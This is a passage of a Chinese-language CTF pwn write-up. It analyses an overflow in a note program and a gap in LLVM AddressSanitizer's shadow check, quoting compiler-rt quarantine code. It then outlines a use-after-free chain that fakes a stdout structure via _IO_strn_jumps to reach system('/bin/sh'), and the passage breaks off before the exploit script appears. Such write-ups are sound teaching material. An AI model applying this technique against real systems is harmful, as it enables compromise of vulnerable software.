class="line">  v7 = *v6;</span><br><span class="line">  <span class="keyword">if</span> ( *v6 != cfi_check )</span><br><span class="line">  &#123;</span><br><span class="line">    _asan_handle_no_return(v6);</span><br><span class="line">    _ubsan_handle_cfi_check_fail_abort(&amp;unk_55555589F100, v7);</span><br><span class="line">  &#125;</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_QWORD, __int64))v7)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)v11, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Update success!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)((v9 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">    _asan_report_load8(v9);</span><br><span class="line">  <span class="keyword">if</span> ( *(_QWORD *)v9 &gt;&gt; <span class="number">44</span> != <span class="number">6L</span>L )</span><br><span class="line">    error(v9);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其根据strlen(note)作为长度依据读入新字符<br>当note与id相接，便会造成溢出，溢出时note再次与id相接，便会溢出更多字节</p>
<h3 id="Analyze-LLVM"><a href="#Analyze-LLVM" class="headerlink" title="Analyze LLVM"></a>Analyze LLVM</h3><p>程序采用llvm检测内存漏洞<br>大致原理：每8字节对应一个标志位，记录当前位置的状态(可读、可写、是否free……),对于一个位置mem，其对应标志位:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shadow&#x3D;(mem_addr&gt;&gt;3)+0x7FFF8000</span><br></pre></td></tr></table></figure>
<p>其检测溢出的原理即是在一段可写内存两端记录一个不可写的redzone位，并在每次读写时都会检测当前位置对应的标志位shadow<br>但是看到update写入id的过程：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v5 = v10 + *(_QWORD *)v9;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)((v5 &gt;&gt; <span class="number">3</span>) + <span class="number">0x7FFF8000</span>) )</span><br><span class="line">  v4 = _asan_report_store8(v5);</span><br><span class="line">*(_QWORD *)v5 = v4;</span><br></pre></td></tr></table></figure>
<p>其检测了*(_BYTE *)v5位置，但是id为__int64，很明显可以在shadow不可写位置写入&lt;8字节的一个数<br>下面主要注意到asan对堆进行free的过程,源码位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;llvm-mirror&#x2F;compiler-rt&#x2F;blob&#x2F;master&#x2F;lib&#x2F;asan&#x2F;asan_allocator.cc</span><br></pre></td></tr></table></figure>
<p><strong>function Deallocate:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Deallocate</span><span class="params">(<span class="keyword">void</span> *ptr, uptr delete_size, uptr delete_alignment,</span></span></span><br><span class="line"><span class="function"><span class="params">                BufferedStackTrace *<span class="built_in">stack</span>, AllocType alloc_type)</span> </span>&#123;</span><br><span class="line">  uptr p = <span class="keyword">reinterpret_cast</span>&lt;uptr&gt;(ptr);</span><br><span class="line">  <span class="keyword">if</span> (p == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  uptr chunk_beg = p - kChunkHeaderSize;</span><br><span class="line">	</span><br><span class="line">  AsanChunk *m = <span class="keyword">reinterpret_cast</span>&lt;AsanChunk *&gt;(chunk_beg);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// On Windows, uninstrumented DLLs may allocate memory before ASan hooks</span></span><br><span class="line">  <span class="comment">// malloc. Don't report an invalid free in this case.</span></span><br><span class="line">  <span class="keyword">if</span> (SANITIZER_WINDOWS &amp;&amp;</span><br><span class="line">      !get_allocator().PointerIsMine(ptr)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!IsSystemHeapAddress(p))</span><br><span class="line">      ReportFreeNotMalloced(p, <span class="built_in">stack</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ASAN_FREE_HOOK(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Must mark the chunk as quarantined before any changes to its metadata.</span></span><br><span class="line">  <span class="comment">// Do not quarantine given chunk if we failed to set CHUNK_QUARANTINE flag.</span></span><br><span class="line">  <span class="keyword">if</span> (!AtomicallySetQuarantineFlagIfAllocated(m, ptr, <span class="built_in">stack</span>)) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (m-&gt;alloc_type != alloc_type) &#123;</span><br><span class="line">    <span class="keyword">if</span> (atomic_load(&amp;alloc_dealloc_mismatch, memory_order_acquire)) &#123;</span><br><span class="line">      ReportAllocTypeMismatch((uptr)ptr, <span class="built_in">stack</span>, (AllocType)m-&gt;alloc_type,</span><br><span class="line">                              (AllocType)alloc_type);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (flags()-&gt;new_delete_type_mismatch &amp;&amp;</span><br><span class="line">        (alloc_type == FROM_NEW || alloc_type == FROM_NEW_BR) &amp;&amp;</span><br><span class="line">        ((delete_size &amp;&amp; delete_size != m-&gt;UsedSize()) ||</span><br><span class="line">         ComputeUserRequestedAlignmentLog(delete_alignment) !=</span><br><span class="line">             m-&gt;user_requested_alignment_log)) &#123;</span><br><span class="line">      ReportNewDeleteTypeMismatch(p, delete_size, delete_alignment, <span class="built_in">stack</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  QuarantineChunk(m, ptr, <span class="built_in">stack</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先是一些对释放位置的redzone位置的检测，如果redzone前八字节对应检测的一些位置被覆盖改变，便会报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ReportFreeNotMalloced(p, <span class="built_in">stack</span>);</span><br><span class="line">ReportAllocTypeMismatch((uptr)ptr, <span class="built_in">stack</span>, (AllocType)m-&gt;alloc_type,</span><br><span class="line">                                (AllocType)alloc_type);</span><br><span class="line">ReportNewDeleteTypeMismatch(p, delete_size, delete_alignment, <span class="built_in">stack</span>);</span><br></pre></td></tr></table></figure>
<p>一切检测过后，会将此位置传入一个队列处理函数QuarantineChunk：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Expects the chunk to already be marked as quarantined by using</span></span><br><span class="line"><span class="comment">// AtomicallySetQuarantineFlagIfAllocated.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QuarantineChunk</span><span class="params">(AsanChunk *m, <span class="keyword">void</span> *ptr, BufferedStackTrace *<span class="built_in">stack</span>)</span> </span>&#123;</span><br><span class="line">  CHECK_EQ(m-&gt;chunk_state, CHUNK_QUARANTINE);</span><br><span class="line">  CHECK_GE(m-&gt;alloc_tid, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (SANITIZER_WORDSIZE == <span class="number">64</span>)  <span class="comment">// On 32-bits this resides in user area.</span></span><br><span class="line">    CHECK_EQ(m-&gt;free_tid, kInvalidTid);</span><br><span class="line">  AsanThread *t = GetCurrentThread();</span><br><span class="line">  m-&gt;free_tid = t ? t-&gt;tid() : <span class="number">0</span>;</span><br><span class="line">  m-&gt;free_context_id = StackDepotPut(*<span class="built_in">stack</span>);</span><br><span class="line"></span><br><span class="line">  Flags &amp;fl = *flags();</span><br><span class="line">  <span class="keyword">if</span> (fl.max_free_fill_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// We have to skip the chunk header, it contains free_context_id.</span></span><br><span class="line">    uptr scribble_start = (uptr)m + kChunkHeaderSize + kChunkHeader2Size;</span><br><span class="line">    <span class="keyword">if</span> (m-&gt;UsedSize() &gt;= kChunkHeader2Size) &#123;  <span class="comment">// Skip Header2 in user area.</span></span><br><span class="line">      uptr size_to_fill = m-&gt;UsedSize() - kChunkHeader2Size;</span><br><span class="line">      size_to_fill = Min(size_to_fill, (uptr)fl.max_free_fill_size);</span><br><span class="line">      REAL(<span class="built_in">memset</span>)((<span class="keyword">void</span> *)scribble_start, fl.free_fill_byte, size_to_fill);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Poison the region.</span></span><br><span class="line">  PoisonShadow(m-&gt;Beg(),</span><br><span class="line">               RoundUpTo(m-&gt;UsedSize(), SHADOW_GRANULARITY),</span><br><span class="line">               kAsanHeapFreeMagic);</span><br><span class="line"></span><br><span class="line">  AsanStats &amp;thread_stats = GetCurrentThreadStats();</span><br><span class="line">  thread_stats.frees++;</span><br><span class="line">  thread_stats.freed += m-&gt;UsedSize();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Push into quarantine.</span></span><br><span class="line">  <span class="keyword">if</span> (t) &#123;</span><br><span class="line">    AsanThreadLocalMallocStorage *ms = &amp;t-&gt;malloc_storage();</span><br><span class="line">    AllocatorCache *ac = GetAllocatorCache(ms);</span><br><span class="line">    quarantine.Put(GetQuarantineCache(ms), QuarantineCallback(ac, <span class="built_in">stack</span>), m,</span><br><span class="line">                   m-&gt;UsedSize());</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    SpinMutexLock l(&amp;fallback_mutex);</span><br><span class="line">    AllocatorCache *ac = &amp;fallback_allocator_cache;</span><br><span class="line">    quarantine.Put(&amp;fallback_quarantine_cache, QuarantineCallback(ac, <span class="built_in">stack</span>),</span><br><span class="line">                   m, m-&gt;UsedSize());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要看到其处理过程，依然是进行一些检测并获得当前线程的一些内存信息，例如:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">thread_stats.frees++;   #已释放chunk数</span><br><span class="line">thread_stats.freed +&#x3D; m-&gt;UsedSize(); #已释放内存大小</span><br></pre></td></tr></table></figure>
<p>最后将即将释放的chunk传入quarantine.Put：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Put</span><span class="params">(Cache *c, Callback cb, Node *ptr, uptr <span class="built_in">size</span>)</span> </span>&#123;</span><br><span class="line">  uptr cache_size = GetCacheSize();</span><br><span class="line">  <span class="keyword">if</span> (cache_size) &#123;</span><br><span class="line">    c-&gt;Enqueue(cb, ptr, <span class="built_in">size</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// GetCacheSize() == 0 only when GetSize() == 0 (see Init).</span></span><br><span class="line">    cb.Recycle(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Check cache size anyway to accommodate for runtime cache_size change.</span></span><br><span class="line">  <span class="keyword">if</span> (c-&gt;Size() &gt; cache_size)</span><br><span class="line">    Drain(c, cb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时通过动态调试看的更加清晰:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">LABEL_30:</span><br><span class="line">      <span class="keyword">if</span> ( v24 &lt; *(_QWORD *)(v12 + <span class="number">0x78</span>) )</span><br><span class="line">        __sanitizer::Quarantine&lt;__asan::QuarantineCallback,__asan::AsanChunk&gt;::Drain(&amp;unk_555555A9F3F8, v12 + <span class="number">96</span>, v47);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(_QWORD *)(v12 + <span class="number">0x60</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v25 = *(_QWORD *)(v12 + <span class="number">112</span>);</span><br><span class="line">      v26 = *(<span class="keyword">const</span> <span class="keyword">char</span> **)(v25 + <span class="number">16</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v26 != (<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;MEMORY[<span class="number">0x3FD</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)v26 &gt; <span class="number">0x3FC</span> )</span><br><span class="line">          __sanitizer::CheckFailed(</span><br><span class="line">            (__sanitizer *)<span class="string">"/build/llvm-toolchain-6.0-QjOn7h/llvm-toolchain-6.0-6.0/projects/compiler-rt/lib/asan/../sani"</span></span><br><span class="line">                           <span class="string">"tizer_common/sanitizer_quarantine.h"</span>,</span><br><span class="line">            &amp;MEMORY[<span class="number">0x2F</span>],</span><br><span class="line">            (<span class="keyword">unsigned</span> __int64)<span class="string">"((count)) &lt; ((kSize))"</span>,</span><br><span class="line">            v26,</span><br><span class="line">            <span class="number">0x3FD</span>uLL,</span><br><span class="line">            v20);</span><br><span class="line">        *(_QWORD *)(v25 + <span class="number">16</span>) = v26 + <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(v25 + <span class="number">8L</span>L * (_QWORD)v26 + <span class="number">24</span>) = v3;</span><br><span class="line">        *(_QWORD *)(v25 + <span class="number">8</span>) += v23;</span><br><span class="line">        *(_QWORD *)(v12 + <span class="number">0x78</span>) += v23;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_30;</span><br></pre></td></tr></table></figure>
<p>内存中会事先开辟一个地方储存队列(addr_init=0x640000000000)，此队列偏移0x10位置为已释放chunk数目，从此位置到队列结尾保存已释放chunk指针，队列偏移8字节位置储存已释放的内存大小，而v12+0x78即为上面提到的<code>thread_stats.freed += m-&gt;UsedSize()</code><br>存入队列后会进入判断：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LABEL_30:</span><br><span class="line">      <span class="keyword">if</span> ( v24 &lt; *(_QWORD *)(v12 + <span class="number">0x78</span>) )        __sanitizer::Quarantine&lt;__asan::QuarantineCallback,__asan::AsanChunk&gt;::Drain(&amp;unk_555555A9F3F8, v12 + <span class="number">96</span>, v47);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>对应put源码位置：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (c-&gt;Size() &gt; cache_size)</span><br><span class="line">      Drain(c, cb);</span><br></pre></td></tr></table></figure>
<p>cache_size在程序bss段，动态调试看到为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;_ZN6__asanL8instanceE+2097896&gt;:	0x0000000000100000</span><br></pre></td></tr></table></figure>
<p>当目前已free内存达到cache_size，即会调用Drain:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> NOINLINE <span class="title">Drain</span><span class="params">(Cache *c, Callback cb)</span> </span>&#123;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">SpinMutexLock <span class="title">l</span><span class="params">(&amp;cache_mutex_)</span></span>;</span><br><span class="line">    cache_.Transfer(c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (cache_.Size() &gt; GetSize() &amp;&amp; recycle_mutex_.TryLock())</span><br><span class="line">    Recycle(atomic_load_relaxed(&amp;min_size_), cb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到最后一步<code>Recycle(atomic_load_relaxed(&amp;min_size_), cb);</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> NOINLINE <span class="title">Recycle</span><span class="params">(uptr min_size, Callback cb)</span> </span>&#123;</span><br><span class="line">  Cache tmp;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="function">SpinMutexLock <span class="title">l</span><span class="params">(&amp;cache_mutex_)</span></span>;</span><br><span class="line">    <span class="comment">// Go over the batches and merge partially filled ones to</span></span><br><span class="line">    <span class="comment">// save some memory, otherwise batches themselves (since the memory used</span></span><br><span class="line">    <span class="comment">// by them is counted against quarantine limit) can overcome the actual</span></span><br><span class="line">    <span class="comment">// user's quarantined chunks, which diminishes the purpose of the</span></span><br><span class="line">    <span class="comment">// quarantine.</span></span><br><span class="line">    uptr cache_size = cache_.Size();</span><br><span class="line">    uptr overhead_size = cache_.OverheadSize();</span><br><span class="line">    CHECK_GE(cache_size, overhead_size);</span><br><span class="line">    <span class="comment">// Do the merge only when overhead exceeds this predefined limit (might</span></span><br><span class="line">    <span class="comment">// require some tuning). It saves us merge attempt when the batch list</span></span><br><span class="line">    <span class="comment">// quarantine is unlikely to contain batches suitable for merge.</span></span><br><span class="line">    <span class="keyword">const</span> uptr kOverheadThresholdPercents = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (cache_size &gt; overhead_size &amp;&amp;</span><br><span class="line">        overhead_size * (<span class="number">100</span> + kOverheadThresholdPercents) &gt;</span><br><span class="line">            cache_size * kOverheadThresholdPercents) &#123;</span><br><span class="line">      cache_.MergeBatches(&amp;tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Extract enough chunks from the quarantine to get below the max</span></span><br><span class="line">    <span class="comment">// quarantine size and leave some leeway for the newly quarantined chunks.</span></span><br><span class="line">    <span class="keyword">while</span> (cache_.Size() &gt; min_size) &#123;</span><br><span class="line">      tmp.EnqueueBatch(cache_.DequeueBatch());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  recycle_mutex_.Unlock();</span><br><span class="line">  DoRecycle(&amp;tmp, cb);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>继续追踪 DoRecycle：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function"><span class="keyword">void</span> NOINLINE <span class="title">DoRecycle</span><span class="params">(Cache *c, Callback cb)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (QuarantineBatch *b = c-&gt;DequeueBatch()) &#123;</span><br><span class="line">      <span class="keyword">const</span> uptr kPrefetch = <span class="number">16</span>;</span><br><span class="line">      CHECK(kPrefetch &lt;= ARRAY_SIZE(b-&gt;batch));</span><br><span class="line">      <span class="keyword">for</span> (uptr i = <span class="number">0</span>; i &lt; kPrefetch; i++)</span><br><span class="line">        PREFETCH(b-&gt;batch[i]);</span><br><span class="line">      <span class="keyword">for</span> (uptr i = <span class="number">0</span>, count = b-&gt;count; i &lt; count; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i + kPrefetch &lt; count)</span><br><span class="line">          PREFETCH(b-&gt;batch[i + kPrefetch]);</span><br><span class="line">        cb.Recycle((Node*)b-&gt;batch[i]);</span><br><span class="line">      &#125;</span><br><span class="line">      cb.Deallocate(b);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其实关键部分在这里，这里会不断循环队列里已经free的chunk，进入asan_allocator下的Recycle：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Recycle</span><span class="params">(AsanChunk *m)</span> </span>&#123;</span><br><span class="line">  CHECK_EQ(m-&gt;chunk_state, CHUNK_QUARANTINE);</span><br><span class="line">  atomic_store((<span class="keyword">atomic_uint8_t</span>*)m, CHUNK_AVAILABLE, memory_order_relaxed);</span><br><span class="line">  CHECK_NE(m-&gt;alloc_tid, kInvalidTid);</span><br><span class="line">  CHECK_NE(m-&gt;free_tid, kInvalidTid);</span><br><span class="line">  PoisonShadow(m-&gt;Beg(),</span><br><span class="line">               RoundUpTo(m-&gt;UsedSize(), SHADOW_GRANULARITY),</span><br><span class="line">               kAsanHeapLeftRedzoneMagic);</span><br><span class="line">  <span class="keyword">void</span> *p = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span> *&gt;(m-&gt;AllocBeg());</span><br><span class="line">  <span class="keyword">if</span> (p != m) &#123;</span><br><span class="line">    uptr *alloc_magic = <span class="keyword">reinterpret_cast</span>&lt;uptr *&gt;(p);</span><br><span class="line">    CHECK_EQ(alloc_magic[<span class="number">0</span>], kAllocBegMagic);</span><br><span class="line">    <span class="comment">// Clear the magic value, as allocator internals may overwrite the</span></span><br><span class="line">    <span class="comment">// contents of deallocated chunk, confusing GetAsanChunk lookup.</span></span><br><span class="line">    alloc_magic[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    CHECK_EQ(alloc_magic[<span class="number">1</span>], <span class="keyword">reinterpret_cast</span>&lt;uptr&gt;(m));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Statistics.</span></span><br><span class="line">  AsanStats &amp;thread_stats = GetCurrentThreadStats();</span><br><span class="line">  thread_stats.real_frees++;</span><br><span class="line">  thread_stats.really_freed += m-&gt;UsedSize();</span><br><span class="line"></span><br><span class="line">  get_allocator().Deallocate(cache_, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到其关键步骤是将此chunk标志为CHUNK_AVAILABLE，以及更改对应标志位shadow(0xfa)，补充一下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Every chunk of memory allocated by this allocator can be in one of 3 states:</span><br><span class="line">&#x2F;&#x2F; CHUNK_AVAILABLE: the chunk is in the free list and ready to be allocated.</span><br><span class="line">&#x2F;&#x2F; CHUNK_ALLOCATED: the chunk is allocated and not yet freed.</span><br><span class="line">&#x2F;&#x2F; CHUNK_QUARANTINE: the chunk was freed and put into quarantine zone.</span><br><span class="line">enum &#123;</span><br><span class="line">  CHUNK_AVAILABLE  &#x3D; 0,  &#x2F;&#x2F; 0 is the default value even if we didn&#39;t set it.</span><br><span class="line">  CHUNK_ALLOCATED  &#x3D; 2,</span><br><span class="line">  CHUNK_QUARANTINE &#x3D; 3</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时我们free掉的chunk即可重新分配<br>其他情况下free掉chunk会设置为CHUNK_QUARANTINE，无法再次分配<br>因此找到重新分配的方法后，剩下的利用就十分简单了</p>
<h3 id="Analyze-EXP-1"><a href="#Analyze-EXP-1" class="headerlink" title="Analyze EXP"></a>Analyze EXP</h3><p><strong>如果我们首先分配一个0x10字节的note<br>我们可以首先利用溢出和一次secret设置shadow位将一个note的下一个临近chunk的size改为0x100000，即可将note在free后重新分配回来，此时对应原来note索引位置的chunk会保存新分配的0x10长度的note，然后即可利用uaf造成任意地址读写，任意地址读写后，很多种方法皆可get shell,这里选择伪造stdout结构体，因为2.27下libc会对vtable地址进行检测，这里利用_IO_strn_jumps来绕过检测执行_IO_str_finish，进而执行system(“/bin/sh”)</strong></p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 